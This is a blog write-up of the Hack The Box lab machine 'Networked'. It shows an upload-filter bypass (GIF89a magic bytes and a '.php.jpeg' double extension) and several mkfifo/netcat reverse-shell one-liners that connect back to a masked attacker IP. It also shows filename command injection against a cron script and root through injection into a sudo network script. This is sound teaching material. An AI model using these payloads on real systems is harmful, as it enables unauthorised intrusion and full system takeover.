---
layout: post
title:  "Hack The Box - Networked"
date:   2019-11-17 11:28:00 +0800
categories: hackthebox linux bash php
---

I really learnt a lot from this box such as the double extension attack and passing of variables into the environment of a command in bash.

![](/assets/images/networked.png){:height="414px" width="615px"}


The operating system that I will be using to tackle this machine is a Kali Linux VM.

Always remember to map a domain name to the machine's IP address to ease your rooting !

{% highlight bash %}
$ echo "10.10.10.146 networked.htb" >> /etc/hosts
{% endhighlight %}

# Reconnaissance

Using `nmap`, we are able to determine the open ports and running services on the machine.
{% highlight bash %}
$ nmap -sV -sT -sC networked.htb
Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-31 11:49 EDT
Nmap scan report for networked.htb (10.10.10.146)
Host is up (0.27s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|_  2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
443/tcp closed https

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 144.41 seconds
{% endhighlight %}

Not much can be done with the `ssh` service as we do not have any credentials on hand so lets come back to it later. As for the `http` service, lets see if we can gather any information or exploit it ?

# Enumeration (1)

`index.php`:
```
Hello mate, we're building the new FaceMash!
Help by funding us and be the new Tyler&Cameron!
Join us at the pool party this Sat to get a glimpse
```

Doesn't seem like much but if we inspect the source:
{% highlight html %}
<html>
<body>
Hello mate, we're building the new FaceMash!</br>
Help by funding us and be the new Tyler&Cameron!</br>
Join us at the pool party this Sat to get a glimpse
<!-- upload and gallery not yet linked -->
</body>
</html>
{% endhighlight %}

Hm... `upload` and `gallery`? Unfortunately, appending them to the URL gives us a `404`. Looks like we have to brute force the directory and files. I will be using `gobuster`:

{% highlight bash %}
$ gobuster dir -u http://networked.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://networked.htb
[+] Threads:        200
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/08/31 21:54:19 Starting gobuster
===============================================================
/uploads (Status: 301)
/backup (Status: 301)
===============================================================
2019/08/31 21:59:28 Finished
===============================================================
{% endhighlight %}

On `/backup` we get a directory listing which only contains `backup.tar`.

![](/assets/images/networked1.png)

After downloading `backup.tar`, we extract all of its contents.
{% highlight bash %}
$ tar -xvf backup.tar
index.php
lib.php
photos.php
upload.php
{% endhighlight %}

Seems like the contents of web server? Maybe this is a backup of the current web server? 

`upload.php`:

![](/assets/images/networked2.png) 

`photos.php`:

![](/assets/images/networked3.png)

Lets try to upload an image into the web server! We clicked on `Browse`, selected our picture and hit `go!`.

![](/assets/images/networked4.png)

Done! If we visit `photos.php` again,

![](/assets/images/networked5.png)

We see a new picture which has a name containing our IP address but with the periods replaced with underscores. Another thing to note is that the extensions were maintained as well.

Since we can upload files onto the server, lets try to upload a `.php` file which will establish a reverse connection by to our listener!

{% highlight bash %}
$ nc -lvnp 1337
listening on [any] 1337 ...
{% endhighlight %}

`reverseconn.php`:
{% highlight php%}
<?php
system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.XXX.XXX 1337 >/tmp/f');
?>
{% endhighlight %}

![](/assets/images/networked6.png)

Looks like our file got rejected :( Since we already have the source code for `upload.php`, lets check it out.

The first to look at is this:
{% highlight php %}
$myFile = $_FILES["myFile"];

    if (!(check_file_type($_FILES["myFile"]) && filesize($_FILES['myFile']['tmp_name']) < 60000)) {
      echo '<pre>Invalid image file.</pre>';
      displayform();
    }

{% endhighlight %}

Since we know our file doesnt exceed 60Mb, we can focus on `check_file_type`. This function is located in `lib.php`.

{% highlight php %}
function check_file_type($file) {
  $mime_type = file_mime_type($file);
  if (strpos($mime_type, 'image/') === 0) {
      return true;
  } else {
      return false;
  }  
}

function file_mime_type($file) {
  $regexp = '/^([a-z\-]+\/[a-z0-9\-\.\+]+)(;\s.+)?$/';
  if (function_exists('finfo_file')) {
    $finfo = finfo_open(FILEINFO_MIME);
    if (is_resource($finfo)) // It is possible that a FALSE value is returned, if there is no magic MIME database file found on the system
    {
      $mime = @finfo_file($finfo, $file['tmp_name']);
      finfo_close($finfo);
      if (is_string($mime) && preg_match($regexp, $mime, $matches)) {
        $file_type = $matches[1];
        return $file_type;
      }
    }
  }
  if (function_exists('mime_content_type'))
  {
    $file_type = @mime_content_type($file['tmp_name']);
    if (strlen($file_type) > 0) // It's possible that mime_content_type() returns FALSE or an empty string
    {
      return $file_type;
    }
  }
  return $file['type'];
}
{% endhighlight %}

Judging from the code, it seems like it is checking the MIME Content-type of the file. Examples of MIME Content-types include `image/jpeg`, `text/html`, `application/json`. This is done by checking the file header bytes and using a MIME database file to determine the Content-Type.

Looks like the Content-Type needs to contain `image/`, such as `image/png`, `image/jpeg` and `image/gif`.

With this knowledge, we know that we need to trick the web server into thinking our file is an image. This can actually be done by prepending `GIF89a` to `reverseconn.php`!
{% highlight php %}
GIF89a
<?php
system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.XXX.XXX 1337 >/tmp/f');
?>
{% endhighlight %}

To find out if it works, we use the `file` command, which uses the same way to determine the file type.
{% highlight bash %}
$ file reverseconn.php
reverseconn.php: GIF image data 16188 x 26736
{% endhighlight %}

Isn't that magical? XD

Next up, we have another section that checks the extension of the file against a list of image extensions.

{% highlight php %}
list ($foo,$ext) = getnameUpload($myFile["name"]);
    $validext = array('.jpg', '.png', '.gif', '.jpeg');
    $valid = false;
    foreach ($validext as $vext) {
      if (substr_compare($myFile["name"], $vext, -strlen($vext)) === 0) {
        $valid = true;
      }
    }
{% endhighlight %}

If we renamed our file from `reverseconn.php` to `reverseconn.jpeg` and try to upload it, the file will be uploaded successfully. However, the file will be treated as an image by the web server.

![](/assets/images/networked7.png)

The function that returns the extension of the file is `getnameUpload`, which is located in `lib.php`. 
{% highlight php %}
function getnameUpload($filename) {
  $pieces = explode('.',$filename);
  $name= array_shift($pieces);
  $name = str_replace('_','.',$name);
  $ext = implode('.',$pieces);
  return array($name,$ext);
}
{% endhighlight %}

After reading the code, we understand that the extension taken from the second period onwards. So if our file name is `reverseconn.php.jpeg`, the extension will be returned will be `.php.jpeg`. Lets rename our file to `reverseconn.php.jpeg` to see what happens.

{% highlight bash %}
connect to [10.10.XXX.XXX] from (UNKNOWN) [10.10.10.146] 36758
sh: no job control in this shell
sh-4.2$ whoami
apache
{% endhighlight %}

Alright it worked! But why? Shouldn't the file still be treated as `.jpeg` file since it ends with it? Since we already have a shell as `apache`, lets check out the config for the `apache` service.

`/etc/httpd/conf.d/php.conf`:
```
AddHandler php5-script .php
```

According to `apache`'s documentation,  if more than one extension is given that maps onto the same type of metadata, then the one to the right will be used, which would mean that `.jpeg` will be used in this case. However, due to the line in `php.conf`, any file with the name containing `.php` will be treated as a `PHP` script by the web server. 

Continuing on, lets see what other users are available on the machine.
{% highlight bash %}
sh-4.2$ ls /home
ls /home
guly
{% endhighlight %}

However when we try to read `user.txt`, 
{% highlight bash %}
sh-4.2$ cat /home/guly/user.txt
cat /home/guly/user.txt
cat: /home/guly/user.txt: Permission denied
{% endhighlight %}

Looks like we need to log in as user `guly`. If we check the home directory of `guly`,
{% highlight bash %}
sh-4.2$ ls /home/guly
ls
check_attack.php
crontab.guly
user.txt
{% endhighlight %}

Checking `crontab.guly`,
```
*/3 * * * * php /home/guly/check_attack.php
```
It contains a crontab entry which runs the `check_attack.php` script every 3 minutes. Checking `check_attack.php`,
{% highlight php %}
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
	$msg='';
  if ($value == 'index.html') {
	continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}

?>
{% endhighlight %}

It scans for all files in the `/var/www/html/uploads` folder, extract the file names without the extensions and check each one of them if they match the naming format that `upload.php` uses, which means that it has to look like `10_10_XXX_XXX.png` or `127_0_0_1.png`. And if they don't, it will be logged as an attack attempt and certain commands will be executed. 

The best part? Looks like we can inject some commands using the `$value` variable, which is the filename of the file. Lets create another listener
{% highlight bash %}
$ nc -lvnp 1338
listening on [any] 1338 ...
{% endhighlight %}

and create a file in `/var/www/html/uploads/` with a very specially crafted name.
```
sh-4.2$ touch "/var/www/html/uploads/; nc -c bash 10.10.XXX.XXX 1338;"
```

With this file name, it will definitely be logged as an attack attempt and trigger the command to be executed.

# user.txt

After a while (due to the `check_attack.php` running every 3 minutes), we get a shell.
{% highlight bash %}
connect to [10.10.XXX.XXX] from (UNKNOWN) [10.10.10.146] 39656
python -c 'import pty; pty.spawn("/bin/bash")'
[guly@networked ~]$ cat user.txt
526cXXXXXXXXXXXXXXXXXXXXXXXXXXXX
{% endhighlight %}

# Enumeration (2)

To quickly enumerate for possible privilege escalation vectors, I will using [LinEnum](https://github.com/rebootuser/LinEnum). To transfer it from my machine to this machine, I will be using `python`'s `SimpleHTTPServer` module.

On my machine:
{% highlight bash %}
$ mkdir httpserver
$ cd httpserver
$ cp ~/Downloads/LinEnum.sh .
$ python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
{% endhighlight %}

On the `Networked` machine:
{% highlight bash %}
[guly@networked ~]$ cd /tmp
[guly@networked /tmp]$ curl http://10.10.XXX.XXX/LinEnum.sh > LinEnum.sh
curl 10.10.XX.XX/LinEnum.sh > LinEnum.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 45651  100 45651    0     0  41674      0  0:00:01  0:00:01 --:--:-- 41690
{% endhighlight %}

When I ran it, I saw something interesting!
{% highlight bash %}
[guly@networked /tmp]$ chmod 777 LinEnum.sh
[guly@networked /tmp]$ ./LinEnum.sh
...
User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh


[+] Possible sudo pwnage!
/usr/local/sbin/changename.sh
{% endhighlight %}

That was easy. This means that we can just `sudo /usr/local/sbin/changename.sh` and be on our jolly way. But here comes the tough part.
{% highlight bash %}
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
	echo "interface $var:"
	read x
	while [[ ! $x =~ $regexp ]]; do
		echo "wrong input, try again"
		echo "interface $var:"
		read x
	done
	echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
  
/sbin/ifup guly0
{% endhighlight %}

Before we start analysing, lets run it first.
{% highlight bash %}
[guly@networked /tmp]$ sudo /usr/local/sbin/changename.sh
sudo /usr/local/sbin/changename.sh
interface NAME:
test
test
interface PROXY_METHOD:
test
test
interface BROWSER_ONLY:
test
test
interface BOOTPROTO:
test
test
ERROR     : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization.
{% endhighlight %}

Looks like something went wrong? According to `changename.sh`, it was reading values for different fields like `NAME`, `PROXY_METHOD` etc and writing them into `/etc/sysconfig/network-scripts/ifcfg-guly` in the given format `FIELD=VALUE`. 

`/etc/sysconfig/network-scripts/ifcfg-guly`:
```
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
NAME=test
PROXY_METHOD=test
BROWSER_ONLY=test
BOOTPROTO=test
```

I wasn't sure how we can inject commands using this script but as I was fuzzing with different values, I saw a new error.

{% highlight bash %}
[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
sudo /usr/local/sbin/changename.sh
interface NAME:
a a
a a
...
/etc/sysconfig/network-scripts/ifcfg-guly: line 4: a: command not found
...
ERROR     : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization.
{% endhighlight %}

Our input is being executed ? Lets try to rerun it but insert a command instead.
{% highlight bash %}
[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
sudo /usr/local/sbin/changename.sh
interface NAME:
a whoami
...
root
...
ERROR     : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization.
{% endhighlight %}

Nice! Now we know where to inject our commands, we proceed to establish our reverse shell connection. However, since our input cannot contain periods (.), we can create a script that contains our reverse shell commands and execute it instead.

On my machine, we start another listener.

{% highlight bash %}
$ nc -lvnp 1339
listening on [any] 1339 ...
{% endhighlight %}

Then, on the `Networked` machine,

{% highlight bash %}
[guly@networked /tmp]$ echo "rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|/bin/sh -i 2>&1|nc 10.10.XXX.XXX 1339 >/tmp/g" > runme
[guly@networked /tmp]$ chmod 777 runme
[guly@networked /tmp]$ sudo /usr/local/sbin/changename.sh
sudo /usr/local/sbin/changename.sh
interface NAME:
a /tmp/runme
...
ERROR     : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization.
{% endhighlight %}

# root.txt

Back on our machine, we caught the reverse shell connection.
{% highlight bash %}
connect to [10.10.XXX.XXX] from (UNKNOWN) [10.10.10.146] 51618
sh: no job control in this shell
sh-4.2# whoami
whoami
root
sh-4.2# cat /root/root.txt
0a8eXXXXXXXXXXXXXXXXXXXXXXXXXXXX
{% endhighlight %}


Rooted ! Thank you for reading and look forward for more writeups and articles !

# Extras

I went on to study how was `/etc/sysconfig/network-scripts/ifcfg-guly` was being used when `/sbin/ifup guly0` was executed and it actually explains why commands can be injected.

`/sbin/ifup guly0`
{% highlight bash %}
#!/bin/bash
...
cd /etc/sysconfig/network-scripts
. ./network-functions
...
CONFIG=${1}
...
source_config
...
{% endhighlight %}

There was one line which was calling `source_config`, which is a function imported from `/etc/sysconfig/network-scripts/network-functions`. How was the function imported? This is where I also learnt that `. <command>` is actually the same as `source <command>`, which reads and execute commands in the `<command>` file, essentially importing the functions in there too.

{% highlight bash %}
source_config ()
{
    CONFIG=${CONFIG##*/}
    ...
    . /etc/sysconfig/network-scripts/$CONFIG
    ...
}
{% endhighlight %}

In `source_config`, the corresponding config file (`ifcfg-guly`) in `/etc/sysconfig/network-scripts` is imported, which calls all the variable assignments lines and this is where commands can be injected into.

When `VAR=VALUE` is executed, you are assigning `VALUE` to `VAR` to the shell. However, when `VAR=VALUE <command>` is executed, `VALUE` is assigned to `VAR` only in the environment context of the `<command>` and the `<command>` is executed!

So when we injected our command, it will be saved as `NAME=a /tmp/runme`, which result in `/tmp/runme` being ran!
